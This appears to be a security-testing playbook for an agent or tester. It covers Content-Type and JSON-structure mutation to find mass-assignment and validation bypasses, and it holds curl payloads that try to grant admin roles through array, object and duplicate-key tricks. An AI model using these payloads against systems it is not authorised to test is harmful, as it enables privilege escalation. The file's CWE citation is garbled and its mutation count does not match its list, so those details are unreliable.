---
name: content_type_mutator
description: Content-Type and JSON structure mutation for parser differentials, mass-assignment, and validation bypass.
---
# Content-Type Mutator

Endpoints accepting multiple content types often have inconsistent validation layers. A role parameter rejected as `role=admin` in form-urlencoded may pass unvalidated when wrapped as JSON. JSON parsers disagree on handling duplicate keys, null values, and type coercion. By mutating the content-type and JSON structure of baseline requests, this pack exposes hidden mass-assignment fields, validation bypasses, and type-confusion vulnerabilities that single-format testing misses.

This pack composes with `packs/web_hunter/SKILL.md` (endpoint discovery), `packs/api_security/SKILL.md` (authz model), and `packs/triage_validation/SKILL.md` (proof gates).

## When to Use

- The endpoint accepts multiple content types (JSON, form-urlencoded, multipart, XML, GraphQL).
- The endpoint performs state mutation (create, update) with validation on hidden or sensitive fields.
- You want to find mass-assignment and parser-differential bugs systematically.
- The endpoint is suspected to use a framework with looser type handling (PHP, Python, Node.js).

## Operating Rules

- Baseline first: capture a request in its documented format (usually JSON).
- Test all 5 content-types: application/json, application/x-www-form-urlencoded, multipart/form-data, text/plain, application/xml.
- For JSON, apply 7 structure mutations: scalar, array-wrap, object-wrap, null, true/false, numeric, duplicate keys.
- Compare semantics: status, response body, field presence, validation errors.
- Stop at proof: one structure mutation that bypasses validation is sufficient.

## Phase 0: Baseline Capture

Document the intended request:

```bash
curl -X POST \
  -H "Authorization: Bearer <your-token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","email":"alice@example.com","role":"user"}' \
  https://target.com/api/users \
  -o baseline.json
```

Expected:
- Status 201 (created).
- Response contains username, email, role=user (not admin).
- No hidden fields set (apiKey, isPremium, etc.).

## Phase 1: Content-Type Variants

Send the same logical request in all 5 formats:

**1. JSON (baseline)**
```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","email":"alice@example.com"}' \
  https://target.com/api/users
```

**2. Form-urlencoded**
```bash
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=alice&email=alice@example.com" \
  https://target.com/api/users
```

**3. Multipart/form-data**
```bash
curl -X POST \
  -F "username=alice" \
  -F "email=alice@example.com" \
  https://target.com/api/users
```

**4. Text/plain**
```bash
curl -X POST \
  -H "Content-Type: text/plain" \
  -d 'username=alice&email=alice@example.com' \
  https://target.com/api/users
```

**5. XML (if endpoint claims to support it or is REST)**
```bash
curl -X POST \
  -H "Content-Type: application/xml" \
  -d '<user><username>alice</username><email>alice@example.com</email></user>' \
  https://target.com/api/users
```

Capture status, response body, and side effects for each. Divergence indicates parser-aware validation.

## Phase 2: JSON Structure Mutations

For the JSON variant, apply 7 structure transformations to each parameter:

```bash
# Parameter: role
# Baseline: "role": "user"

# 1. Scalar (baseline)
-d '{"role":"user"}'

# 2. Array-wrap
-d '{"role":["user"]}'

# 3. Array with multiple values
-d '{"role":["user","admin"]}'

# 4. Object-wrap
-d '{"role":{"value":"user"}}'

# 5. Object with implicit type cast
-d '{"role":{"user":true}}'

# 6. Null
-d '{"role":null}'

# 7. Numeric (if the field is a string)
-d '{"role":1}'

# 8. Boolean
-d '{"role":true}'

# 9. Duplicate keys (first wins vs. last wins varies by parser)
# Craft raw JSON manually to preserve duplicate keys:
printf '{"role":"user","role":"admin"}' | curl -X POST ... -d @-

# 10. Empty string
-d '{"role":""}'
```

For hidden fields (role, admin, isPremium, apiKey), test array/object/null variants:

```bash
# Attempt to set admin flag via object coercion
-d '{"username":"alice","admin":{"set":true}}'

# Attempt to set via null coercion
-d '{"username":"alice","admin":null,"role":["admin"]}'

# Attempt via duplicate key
printf '{"role":"user","role":"admin"}' | curl -X POST ...
```

## Phase 3: Semantic Analysis & Divergence

Compare responses across content-types and JSON mutations:

| Variant | Status | Response.role | Response.admin | Validation Error | Classification |
|---------|--------|---------------|----------------|------------------|-----------------|
| baseline JSON | 201 | user | false | — | ✓ expected |
| form-urlencoded | 201 | user | false | — | ✓ expected |
| array-wrap JSON | 201 | user | **true** | — | ⚠️ COERCION |
| null JSON | 400 | — | — | "role required" | ✓ expected |
| duplicate keys | 201 | **admin** | — | — | ⚠️ PARSER-DIFF |
| object-wrap | 201 | — | **true** | — | ⚠️ MASS-ASSIGN |

**Findings trigger on:**
- **Status divergence** (one format 201, another 400): parser difference in validation.
- **Field set unexpectedly** (admin=true or role=admin in response when not in request): mass-assignment or coercion.
- **Validation error text change** (one format rejected, another accepted): validator operates per-format.
- **Hidden field appears** (apiKey, isPremium set to unexpected value): type coercion bypasses validation.

## Theories This Pack Owns

- `mass-assignment.array-coercion` (array-wrap scalar bypasses type check)
- `mass-assignment.object-coercion` (object-wrap bypasses validation)
- `mass-assignment.null-default` (null parameter defaults to hidden-field behavior)
- `parser-differential.form-vs-json` (form-urlencoded and JSON validated differently)
- `parser-differential.duplicate-key-precedence` (JSON duplicate keys, last-wins or first-wins conflict)

## Tooling

- `curl` with `-H Content-Type` and `-d` for inline payloads.
- Custom wrapper to generate 7 JSON mutations per parameter.
- `jq` for parsing and comparing response structures.
- Intercepting-proxy repeater for interactive content-type switching.

## See Also

- `packs/web_hunter/SKILL.md` — endpoint discovery
- `packs/api_security/SKILL.md` — authz model and mass-assignment patterns
- `packs/triage_validation/SKILL.md` — semantic-diff gates
- CWE-915 (Improperly Controlled Multiple Interpretation of Web Input) and CWE-915

## Exclusions

- No actual mutation of production data; use test accounts.
- No attempt to escalate to actual admin access (proof is one mutation that bypasses validation, not full exploit).
- No DoS via large payloads or deeply nested structures.
- No persistence of mutated state; revert or request cleanup after proof.
